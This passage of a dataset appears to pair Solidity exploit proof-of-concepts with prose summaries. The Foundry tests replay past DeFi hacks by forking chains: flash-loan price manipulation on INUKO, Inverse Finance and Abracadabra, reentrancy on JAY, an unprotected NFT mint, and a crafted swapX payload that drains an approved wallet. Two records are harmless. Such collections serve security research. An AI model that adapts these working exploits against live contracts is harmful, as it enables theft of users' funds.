WBNB.balanceOf(address(this));\n        address(WBNB).call(abi.encodeWithSignature(\"withdraw(uint)\", BNBAmount));\n        uint BUSDAmount = BUSD.balanceOf(address(this));\n        uint ETHAmount = ETH.balanceOf(address(this));\n        uint BTCBAmount = BTCB.balanceOf(address(this));\n        address [] memory cTokens = new address[](5);\n        cTokens[0] = address(vBNB);\n        cTokens[1] = address(vUSDT);\n        cTokens[2] = address(vBUSD);\n        cTokens[3] = address(vETH);\n        cTokens[4] = address(vBTC);\n        unitroller.enterMarkets(cTokens);\n        vBNB.mint{value: BNBAmount}();\n        BUSD.approve(address(vBUSD), type(uint).max);\n        vBUSD.mint(BUSDAmount);\n        ETH.approve(address(vETH), type(uint).max);\n        vETH.mint(ETHAmount);\n        BTCB.approve(address(vBTC), type(uint).max);\n        vBTC.mint(BTCBAmount);\n        (, uint amount, ) = unitroller.getAccountLiquidity(address(this));\n        \n        vUSDT.borrow(amount * 99 / 100);\n        USDT.transfer(address(Pair), USDT.balanceOf(address(this)));\n        bond.buyBond(Pair.balanceOf(address(this)), 0);\n        Pair.skim(address(this));\n        USDT.approve(address(vUSDT), type(uint).max);\n        vUSDT.repayBorrow(amount * 99 / 100);\n        vBNB.redeemUnderlying(BNBAmount);\n        address(WBNB).call{value: address(this).balance}(\"\");\n        vBUSD.redeemUnderlying(BUSDAmount);\n        vETH.redeemUnderlying(ETHAmount);\n        vBTC.redeemUnderlying(BTCBAmount);\n    }\n\n\n    function claimAndSell() internal{\n        bond.claim(0);\n        INUKO.approve(address(Router), type(uint).max);\n        address [] memory path = new address[](2);\n        path[0] = address(INUKO);\n        path[1] = address(USDT);\n        // TX LIMIT\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            25_000 * 1e18,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            25_000 * 1e18,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            INUKO.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    receive() payable external{}\n}\n",
        "summary": "This is a Solidity smart contract that performs an exploit on a DeFi protocol called INUKO Finance. The code manipulates the price of INUKO token using flash loans from various DEXs and then buys a bond from the INUKO protocol. After a certain period of time has passed, the contract claims the bond reward and sells the INUKO token on a DEX. The contract also uses lending and repayment on the Venus protocol to acquire additional funds to exploit the INUKO protocol.",
        "id": "e71ce03a-1351-49fa-ab38-6af0fa785fb6"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);\n  IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n  USDT usdt = USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);\n  IERC20 DOLA = IERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4);\n  ILendingPool aaveLendingPool =\n    ILendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);\n  VyperContract curveVyper_contract =\n    VyperContract(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46);\n  IERC20 crv3crypto = IERC20(0xc4AD29ba4B3c580e6D59105FFf484999997675Ff);\n  VyperContract yvCurve3Crypto =\n    VyperContract(0xE537B5cc158EB71037D4125BDD7538421981E6AA);\n  VyperContract curveRegistry =\n    VyperContract(0x8e764bE4288B842791989DB5b8ec067279829809);\n  VyperContract dola3pool3crv =\n    VyperContract(0xAA5A67c256e27A5d80712c51971408db3370927D);\n  VyperContract curve3pool =\n    VyperContract(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);\n  CErc20Interface anYvCrv3CryptoInverse =\n    CErc20Interface(0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587);\n  IUnitroller Unitroller =\n    IUnitroller(0x4dCf7407AE5C07f8681e1659f626E114A7667339);\n  IAggregator YVCrv3CryptoFeed =\n    IAggregator(0xE8b3bC58774857732C6C1147BFc9B9e5Fb6F427C);\n  CErc20Interface InverseFinanceDola =\n    CErc20Interface(0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670);\n  IERC20 crv3 = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);\n  address[] assets = [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599];\n  uint256[] amounts = [2700000000000];\n  uint256[] modes = [0];\n  uint256[3] amounts2 = [0, 22500000000, 0];\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 14972418); // fork mainnet at block 14972418\n  }\n\n  function testExploit() public {\n    aaveLendingPool.flashLoan(\n      address(this),\n      assets,\n      amounts,\n      modes,\n      address(this),\n      \"0x\",\n      0\n    );\n    emit log_named_uint(\n      \"After flashloan repaid, profit in WBTC of attacker:\",\n      WBTC.balanceOf(address(this))\n    );\n  }\n\n  function executeOperation(\n    address[] memory assets,\n    uint256[] memory amounts,\n    uint256[] memory premiums,\n    address initiator,\n    bytes memory params\n  ) public returns (bool) {\n    assets;\n    amounts;\n    premiums;\n    params;\n    initiator;\n\n    WBTC.approve(address(curveVyper_contract), type(uint256).max);\n    WBTC.approve(address(curveRegistry), type(uint256).max);\n    usdt.approve(address(curveRegistry), type(uint256).max);\n    DOLA.approve(address(curveRegistry), type(uint256).max);\n    crv3crypto.approve(\n      0xE537B5cc158EB71037D4125BDD7538421981E6AA,\n      type(uint256).max\n    );\n\n    emit log_named_uint(\n      \"Flashloaned, WBTC balance of attacker:\",\n      WBTC.balanceOf(address(this)) / 1e8\n    );\n\n    curveVyper_contract.add_liquidity(amounts2, 0);\n    emit log_named_uint(\n      \"After add-liquidity, crv3crypto balance of attacker:\",\n      crv3crypto.balanceOf(address(this))\n    );\n    emit log_named_uint(\n      \"After add-liquidity, WBTC balance of attacker:\",\n      WBTC.balanceOf(address(this)) / 1e8\n    );\n    yvCurve3Crypto.deposit(5375596969399930881565, address(this));\n    emit log_named_uint(\n      \"Deposited to Yearns Vault, yvCurve3 balance of attacker:\",\n      yvCurve3Crypto.balanceOf(address(this))\n    );\n    yvCurve3Crypto.approve(\n      0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587,\n      100000000000000000000000000000000000000000000000000\n    );\n    anYvCrv3CryptoInverse.mint(4906754677503974414310);\n    emit log_named_uint(\n      \"Deposited to Inverse Yearn 3Crypto Vault, anYvCrv3Crypto balance of attacker:\",\n      anYvCrv3CryptoInverse.balanceOf(address(this))\n    );\n    address[] memory toEnter = new address[](1);\n    toEnter[0] = 0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587;\n    Unitroller.enterMarkets(toEnter);\n\n    emit log_named_int(\n      \"YVCrv3CryptoFeed lastanswer:\",\n      YVCrv3CryptoFeed.latestAnswer()\n    );\n    emit log_named_uint(\n      \"Before swap, USDT balance of attacker:\",\n      usdt.balanceOf(address(this))\n    );\n    emit log_named_uint(\n      \"Before swap, WBTC balance of CRV3Pool:\",\n      WBTC.balanceOf(address(curveVyper_contract))\n    );\n    emit log_named_uint(\n      \"Before swap, WETH balance of CRV3Pool:\",\n      WETH.balanceOf(address(curveVyper_contract))\n    );\n    emit log_named_uint(\n      \"Before swap, USDT balance of CRV3Pool:\",\n      usdt.balanceOf(address(curveVyper_contract))\n    );\n    curveRegistry.exchange(\n      address(curveVyper_contract),\n      address(WBTC),\n      address(usdt),\n      2677500000000,\n      0,\n      address(this)\n    );\n    emit log_named_uint(\n      \"After swap, USDT balance of attacker:\",\n      usdt.balanceOf(address(this))\n    );\n    emit log_named_uint(\n      \"After swap, WBTC balance of CRV3Pool:\",\n      WBTC.balanceOf(address(curveVyper_contract))\n    );\n    emit log_named_uint(\n      \"After swap, WBTC balance of CRV3Pool:\",\n      WETH.balanceOf(address(curveVyper_contract))\n    );\n    emit log_named_uint(\n      \"After swap, USDT balance of CRV3Pool:\",\n      usdt.balanceOf(address(curveVyper_contract))\n    );\n    emit log_named_int(\n      \"Manipulated YVCrv3CryptoFeed lastanswer:\",\n      YVCrv3CryptoFeed.latestAnswer()\n    );\n    InverseFinanceDola.borrow(10133949192393802606886848);\n    emit log_named_uint(\n      \"DOLA balance of attacker:\",\n      DOLA.balanceOf(address(this))\n    );\n    curveRegistry.exchange(\n      address(curveVyper_contract),\n      address(usdt),\n      address(WBTC),\n      75403376186072,\n      0,\n      address(this)\n    );\n    emit log_named_uint(\n      \"After swap, WBTC balance of attacker:\",\n      WBTC.balanceOf(address(this)) / 1e8\n    );\n    curveRegistry.exchange(\n      address(dola3pool3crv),\n      address(DOLA),\n      address(crv3),\n      10133949192393802606886848,\n      0,\n      address(this)\n    );\n    emit log_named_uint(\n      \"After swap,3crv balance of attacker:\",\n      crv3.balanceOf(address(this))\n    );\n    curve3pool.remove_liquidity_one_coin(9881355040729892287779421, 2, 0);\n    emit log_named_uint(\n      \"After swap, USDT balance of attacker:\",\n      usdt.balanceOf(address(this))\n    );\n    curveRegistry.exchange(\n      address(curveVyper_contract),\n      address(usdt),\n      address(WBTC),\n      10000000000000,\n      0,\n      address(this)\n    );\n    emit log_named_uint(\n      \"After swap, WBTC balance of attacker:\",\n      WBTC.balanceOf(address(this))\n    );\n    WBTC.approve(address(aaveLendingPool), 2702430000000);\n\n    return true;\n  }\n\n  receive() external payable {}\n}\n",
        "summary": "This code is a Solidity contract used to simulate an exploit. It imports a few other contracts, initializes some contract references, sets up some test values, and includes two functions. The `setUp()` function sets up a fork, and the `testExploit()` function performs a flash loan from Aave, and then executes a series of swaps and other operations to manipulate prices and balances to generate a profit. The function outputs the final balance of the attacker's WBTC tokens.",
        "id": "a075d115-eab1-41a6-8ad7-86e4b25ff050"
    },
    {
        "code": "// SPDX-License-Identifier: WTFPL\npragma solidity ^0.8.19;\n\ninterface ISignatureChecker {\n    function is_valid_signature_now(\n        address signer,\n        bytes32 hash,\n        bytes calldata signature\n    ) external view returns (bool);\n\n    function is_valid_ERC1271_signature_now(\n        address signer,\n        bytes32 hash,\n        bytes calldata signature\n    ) external view returns (bool);\n}\n",
        "summary": "This code declares an interface named `ISignatureChecker` which includes two functions: `is_valid_signature_now` and `is_valid_ERC1271_signature_now`. Both functions take the `signer` address, a `bytes32` hash, and a `bytes` signature as parameters. The functions verify the validity of the signature and return a boolean value. The `pragma` specifies the Solidity compiler version to use and the `SPDX-License-Identifier` specifies the license that the code is released under.",
        "id": "dc5eb38d-d097-4b52-9fa6-28aca6ca7833"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1608372475225866240\n\n// @TX\n// https://etherscan.io/tx/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6\n\ninterface IJay {\n    function buyJay(\n        address[] memory erc721TokenAddress,\n        uint256[] memory erc721Ids,\n        address[] memory erc1155TokenAddress,\n        uint256[] memory erc1155Ids,\n        uint256[] memory erc1155Amounts\n    ) external payable;\n    function sell(uint256 value) external;\n    function balanceOf(address account) external view returns (uint256);\n}\n\n\ncontract ContractTest is DSTest{\n    IJay JAY = IJay(0xf2919D1D80Aff2940274014bef534f7791906FF2);\n    IBalancerVault Vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);\n    WETH weth = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16288199);    // Fork mainnet at block 16288199\n    }\n\n    function testExploit() public {\n        payable(address(0)).transfer(address(this).balance);\n        emit log_named_decimal_uint(\n            \"[Start] ETH balance before exploitation:\",\n            address(this).balance,\n            18\n        );\n        // Setup up flashloan paramaters.\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(weth); \n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 72.5 ether;\n        bytes memory b = \"0x000000000000000000000000000000000000000000000001314fb37062980000000000000000000000000000000000000000000000000002bcd40a70853a000000000000000000000000000000000000000000000000000030927f74c9de00000000000000000000000000000000000000000000000000006f05b59d3b200000\";\n        // Execute the flashloan. It will return in receiveFlashLoan()\n        Vault.flashLoan(address(this), tokens, amounts, b);\n    }\n\n    function receiveFlashLoan(\n        IERC20[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        require(msg.sender == address(Vault));\n\n        // Transfer WETH to ETH and start the attack.\n        weth.withdraw(amounts[0]);\n\n        JAY.buyJay{value: 22 ether}(new address[](0),new uint256[](0),new address[](0),new uint256[](0),new uint256[](0));\n\n        address[] memory erc721TokenAddress = new address[](1);\n        erc721TokenAddress[0] = address(this);\n\n        uint256[] memory erc721Ids = new uint256[](1);\n        erc721Ids[0]= 0;\n        \n        JAY.buyJay{value: 50.5 ether}(erc721TokenAddress, erc721Ids,new address[](0),new uint256[](0),new uint256[](0));\n        JAY.sell(JAY.balanceOf(address(this)));\n        JAY.buyJay{value: 3.5 ether}(new address[](0),new uint256[](0),new address[](0),new uint256[](0),new uint256[](0));\n        JAY.buyJay{value: 8 ether}(erc721TokenAddress,erc721Ids,new address[](0),new uint256[](0),new uint256[](0));\n        JAY.sell(JAY.balanceOf(address(this)));\n\n        // Repay the flashloan by depositing ETH for WETH and transferring.\n        address(weth).call{value: 72.5 ether}(\"deposit\");\n        weth.transfer(address(Vault), 72.5 ether);\n\n        emit log_named_decimal_uint(\n            \"[End] ETH balance after exploitation:\",\n            address(this).balance,\n            18\n        );\n    }\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\n            JAY.sell(JAY.balanceOf(address(this)));  // reenter call JAY.sell\n    }\n  receive() external payable {}\n}\n\n\n\n\n",
        "summary": "This code defines a contract called `ContractTest` that exploits a series of vulnerabilities in contracts `IJay` and `IBalancerVault` in order to gain an advantage in a DeFi system. In particular, it performs a flash loan attack that involves borrowing a large quantity of funds without collateral, manipulating the prices of some DeFi assets, and triggering a reentrancy attack in the `IJay` contract to buy an asset at an artificially low price. Finally, it repays the flash loan and profits from the price manipulation. The code imports two external interfaces to interact with the `IJay` and `IBalancerVault` contracts, and also uses a `WETH` interface to convert between Ether and Wrapped Ether, as well as a `CheatCodes` interface to create a fork of the underlying blockchain for testing purposes.",
        "id": "1a1d876f-5ef2-4b9a-91be-e855edb951cc"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://eigenphi.substack.com/p/casting-a-magic-spell-on-abracadabra\n// https://twitter.com/BlockSecTeam/status/1603633067876155393\n// @TX\n// https://etherscan.io/tx/0x3d163bfbec5686d428a6d43e45e2626a220cc4fcfac7620c620b82c1f2537c78\n\ninterface BentoBoxV1{\n    function batchFlashLoan(\n        address borrower,\n        address[] calldata receivers,\n        address[] calldata tokens,\n        uint256[] calldata amounts,\n        bytes calldata data\n    ) external;\n\n    function setMasterContractApproval(\n        address user,\n        address masterContract,\n        bool approved,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n\n    function deposit(\n        address token_,\n        address from,\n        address to,\n        uint256 amount,\n        uint256 share\n    ) external;\n\n    function withdraw(\n        address token_,\n        address from,\n        address to,\n        uint256 amount,\n        uint256 share\n    ) external;\n\n    function balanceOf(\n        address token,\n        address account\n    ) external returns(uint256);\n}\n\ninterface CauldronMediumRiskV1{\n    function addCollateral(\n        address to,\n        bool skim,\n        uint256 share\n    ) external;\n\n    function borrow(address to, uint256 amount) external;\n\n    function updateExchangeRate() external;\n\n    function liquidate(\n        address[] calldata users,\n        uint256[] calldata maxBorrowParts,\n        address to,\n        address swapper\n    ) external;\n}\n\ncontract ContractTest is DSTest{\n    BentoBoxV1 BentBox = BentoBoxV1(0xF5BCE5077908a1b7370B9ae04AdC565EBd643966);\n    CauldronMediumRiskV1 Cauldron = CauldronMediumRiskV1(0xbb02A884621FB8F5BFd263A67F58B65df5b090f3);\n    IERC20 xSUSHI = IERC20(0x8798249c2E607446EfB7Ad49eC89dD1865Ff4272);\n    IERC20 MIM = IERC20(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);\n    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    ISushiSwap Router = ISushiSwap(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);\n    address masterContract = 0x4a9Cb5D0B755275Fd188f87c0A8DF531B0C7c7D2;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 15928289);\n    }\n\n    function testExploit() public {\n        MIM.approve(address(Router), type(uint).max);\n        address[] memory receivers = new address[](2);\n        receivers[0] = address(this);\n        receivers[1] = address(this);\n        address[] memory tokens = new address[](2);\n        tokens[0] = address(xSUSHI);\n        tokens[1] = address(MIM);\n        uint256[] memory amounts = new uint256[](2);\n        amounts[0] = 450_000 * 1e18;\n        amounts[1] = 0;\n        BentBox.batchFlashLoan(address(this), receivers, tokens, amounts, new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker MIM balance after exploit\",\n            MIM.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function onBatchFlashLoan(\n        address sender,\n        IERC20[] calldata tokens,\n        uint256[] calldata amounts,\n        uint256[] calldata fees,\n        bytes calldata data\n    ) external {\n        BentBox.setMasterContractApproval(address(this), masterContract, true, uint8(0), bytes32(0), bytes32(0));\n        xSUSHI.approve(address(BentBox), type(uint).max);\n        BentBox.deposit(address(xSUSHI), address(this), address(this), 0, 420_000 * 1e18);\n        Cauldron.addCollateral(address(this), false, 420_000 * 1e18);\n        Cauldron.borrow(address(this), 800_000 * 1e18);\n        Cauldron.updateExchangeRate();\n        address[] memory users = new address[](1);\n        users[0] = address(this);\n        uint256[] memory maxBorrowParts = new uint256[](1);\n        maxBorrowParts[0] = 680_000 * 1e18;\n        Cauldron.liquidate(users, maxBorrowParts, address(this), address(0));\n        BentBox.withdraw(address(xSUSHI), address(this), address(this), 0, BentBox.balanceOf(address(xSUSHI), address(this)));\n        BentBox.withdraw(address(MIM), address(this), address(this), 0, BentBox.balanceOf(address(MIM), address(this)));\n        uint swapAmount = 450_000 * 1e18 * 10005 / 10000 - xSUSHI.balanceOf(address(this));\n        address[] memory path = new address[](3);\n        path[0] = address(MIM);\n        path[1] = address(WETH);\n        path[2] = address(xSUSHI);\n        Router.swapTokensForExactTokens(swapAmount, type(uint).max, path, address(this), block.timestamp);\n        xSUSHI.transfer(address(BentBox), 450_225 * 1e18);\n    }\n    \n}",
        "summary": "This code is a Solidity smart contract that performs a flash loan exploit on a vulnerable contract called CauldronMediumRiskV1. The contract uses the BentoBoxV1 contract to carry out the flash loan by borrowing 450,000 xSUSHI tokens and 0 MIM tokens, then uses these tokens as collateral to borrow 800,000 stablecoins. The attacker then causes the price of xSUSHI to drop (by liquidating the borrowed funds and swapping MIM for xSUSHI) before paying back the initial flash loan with interest and profiting from the price drop of xSUSHI tokens. The code also includes functions for testing the exploit and creating a fork for testing purposes.",
        "id": "c711d285-36c3-4089-aef2-8c84a2af739f"
    },
    {
        "code": "// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.13;\n\ncontract Contract { }\n",
        "summary": "This code defines a contract named \"Contract\" using the Solidity programming language, but it does not contain any functions or variables. Additionally, it includes a licensing statement saying that the code is licensed under the Unlicense. The Solidity version used is 0.8.13.",
        "id": "cdebab26-18da-4a10-9132-4e94128fb3d4"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : 200 land NFT => 28,601 $XQJ  => 149,616 $BUSD\n// Attack Tx : https://bscscan.com/tx/0xe4db1550e3aa78a05e93bfd8fbe21b6eba5cce50dc06688949ab479ebed18048\n// @Analysis\n// https://twitter.com/BeosinAlert/status/1658000784943124480?cxt=HHwWgMDU_b27s4IuAAAA\n// https://twitter.com/BeosinAlert/status/1658002030953365505?cxt=HHwWgoDQvYGEtIIuAAAA\n// @Summary\n// Vulnerability: lack of permission control on mint\n\ninterface IMiner {\n    function mint(address[] memory to, uint256[] memory value) external;\n}\n\ncontract ContractTest is Test {\n    IERC721 landNFT = IERC721(0x1a62fe088F46561bE92BB5F6e83266289b94C154);\n    IMiner minerContract = IMiner(0x2e599883715D2f92468Fa5ae3F9aab4E930E3aC7);\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28208132);\n        cheats.label(address(landNFT), \"landNFT\");\n        cheats.label(address(minerContract), \"Miner\");\n    }\n\n    function testExploit() public {\n        emit log_named_uint(\n            \"Attacker amount of NFT land before mint\",\n            landNFT.balanceOf(address(this))\n        );\n\n        address[] memory to = new address[](1);\n        to[0] = address(this);\n        uint256[] memory amount = new uint256[](1);\n        amount[0] = 200;\n        minerContract.mint(to, amount);\n\n        emit log_named_uint(\n            \"Attacker amount of NFT land after mint\",\n            landNFT.balanceOf(address(this))\n        );\n    }\n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes memory\n    ) external returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n}\n",
        "summary": "This is a smart contract that exploits a vulnerability in a Miner contract by minting 200 land NFTs without proper permission controls. It imports the Solidity test framework and an interface contract. The code then sets up the necessary contracts, including the Miner contract, the CheatCodes contract, and an IERC721 interface contract. It defines a setup function to label the contracts and a testExploit function to execute the exploit by minting the 200 land NFTs, and a callback function onERC721Received for NFT land. The contract emits logs before and after the minting. Finally, the contract is marked as a test contract using the Test smart contract.",
        "id": "03bc6f30-583d-4dda-99dc-e4b4dcede543"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\n\n// analysis\n// https://blog.verichains.io/p/analyzing-the-lz-token-hack\n// https://twitter.com/immunefi/status/1630210901360951296\n// https://bscscan.com/tx/0xaee8ef10ac816834cd7026ec34f35bdde568191fe2fa67724fcf2739e48c3cae exploit tx\n\n// reponse\n// https://twitter.com/launchzoneann/status/1631538253424918528\n\n// contracts to study\n// https://bscscan.com/address/0x0ccee62efec983f3ec4bad3247153009fb483551 proxy for implementation (verified)\n// https://bscscan.com/address/0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01 implementation (unverified)\n// https://bscscan.com/address/0x1c2b102f22c08694eee5b1f45e7973b6eaca3e92  attacker contract\n\ninterface UniRouterLike {\n    function swap(\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes calldata data\n    ) external;\n\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n\n    function getAmountsOut(uint256 amountIn, address[] calldata path)\n        external\n        view\n        returns (uint256[] memory amounts);\n}\n\ninterface ERC20Like {\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n}\n\ncontract LaunchZoneExploit is Test {\n    ERC20Like LZ;\n    ERC20Like BUSD;\n    ERC20Like BISWAPPair;\n    UniRouterLike BISWAPRouter;\n    UniRouterLike pancackeRouter;\n\n    address immutable BscexDeployer =\n        0xdad254728A37D1E80C21AFae688C64d0383cc307;\n    address immutable attacker = 0x1C2B102f22c08694EEe5B1f45E7973b6EACA3e92;\n\n    address immutable swapXImp = 0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01; // unverified\n\n    function setUp() public {\n        // select and fork bsc at 26024420\n        vm.createSelectFork(\"bsc\", 26_024_420 - 1); // previous block so still there is fund\n        LZ = ERC20Like(0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2);\n        BUSD = ERC20Like(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n        BISWAPPair = ERC20Like(0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593);\n        BISWAPRouter = UniRouterLike(\n            0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8\n        );\n        pancackeRouter = UniRouterLike(\n            0x10ED43C718714eb63d5aA57B78B54704E256024E\n        );\n\n        vm.label(BscexDeployer, \"BscexDeployer\");\n\n        vm.label(address(LZ), \"LZ\");\n        vm.label(address(BUSD), \"BUSD\");\n        vm.label(address(BISWAPPair), \"BISWAP\");\n        vm.label(address(BISWAPRouter), \"BISWAP Router\");\n        vm.label(attacker, \"attacker\");\n        vm.label(address(this), \"thisContract\");\n    }\n\n    function testExploit() public {\n        console.log(\"Running on BSC at : \", block.number);\n\n        console.log(\"BscexDeployer LZ Balalnce\", LZ.balanceOf(BscexDeployer));\n        console.log(\n            \"LZ allowance to swapXImp\",\n            LZ.allowance(BscexDeployer, swapXImp) / 1e18\n        );\n\n        //  lazy payload check the previous swapX PoC\n        //  swapX.call(abi.encodeWithSelector(0x4f1f05bc, swapPath, transferAmount, value, array, victims[i]));\n        //  calling unverified contract of swapXImp with payload containing swap\n        //  (bool success, bytes memory returndata) = swapXImpl.call{value: msg.value}(data);\n\n        bytes\n            memory payload = hex\"4f1f05bc00000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000082da53fc059357f82f9b400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000dad254728a37d1e80c21afae688c64d0383cc30700000000000000000000000000000000000000000000000000000000000000020000000000000000000000003b78458981eb7260d1f781cb8be2caac7027dbe2000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d5600000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\";\n        (bool success, ) = address(swapXImp).call(payload);\n        console.log(\"Payload delivered\", success);\n\n        console.log(\n            \"BscexDeployer BUSD Balalnce\",\n            BUSD.balanceOf(BscexDeployer) / 1e18\n        );\n\n        // give attacker 50 BUSD\n        deal(address(BUSD), address(this), 50 * 1e18);\n\n        // get BUSD from attacker\n        console.log(\n            \"attacker BUSD Balalnce\",\n            BUSD.balanceOf(address(this)) / 1e18\n        );\n\n        // approve router for 50 BUSD\n        BUSD.approve(address(BISWAPRouter), 50 * 1e18);\n\n        //get amount out for BUSD to LZ\n        // define path\n        address[] memory path = new address[](2);\n        path[0] = address(BUSD);\n        path[1] = address(LZ);\n\n        uint256[] memory amounts = BISWAPRouter.getAmountsOut(50 * 1e18, path);\n        console.log(\"amounts BUSD/LZ\", amounts[0] / 1e18, amounts[1] / 1e18);\n\n        // do the swap\n        BISWAPRouter.swapExactTokensForTokens(\n            amounts[0],\n            amounts[1],\n            path,\n            address(this),\n            block.timestamp\n        );\n\n        // at this point attack has 9_886_999 for 50 BUSD\n        console.log(\"attacker LZ Balalnce\", LZ.balanceOf(address(this)) / 1e18);\n\n        console.log(\n            \"attacker BUSD Balalnce\",\n            BUSD.balanceOf(address(this)) / 1e18\n        );\n\n        // reverse swap on pancake\n        // building a  new path\n        address[] memory path2 = new address[](2);\n        path2[0] = address(LZ);\n        path2[1] = address(BUSD);\n\n        // get amount out for LZ to BUSD from pancackeRouter\n        uint256[] memory amounts2 = pancackeRouter.getAmountsOut(\n            LZ.balanceOf(address(this)),\n            path2\n        );\n\n        console.log(\"amounts LZ/BUSD\", amounts2[0] / 1e18, amounts2[1] / 1e18);\n\n        // attacker gets 88,899 BUSD for 9,886,999 LZ which bought for 50 BUSD\n        // approve pancackeRouter for 9,886,999 LZ\n        LZ.approve(address(pancackeRouter), LZ.balanceOf(address(this)));\n\n        // do the swap\n        pancackeRouter.swapExactTokensForTokens(\n            amounts2[0],\n            amounts2[1],\n            path2,\n            address(this),\n            block.timestamp\n        );\n        // check current BSUSD balance\n        console.log(\n            \"attacker BUSD Balalnce\",\n            BUSD.balanceOf(address(this)) / 1e18\n        );\n    }\n}\n",
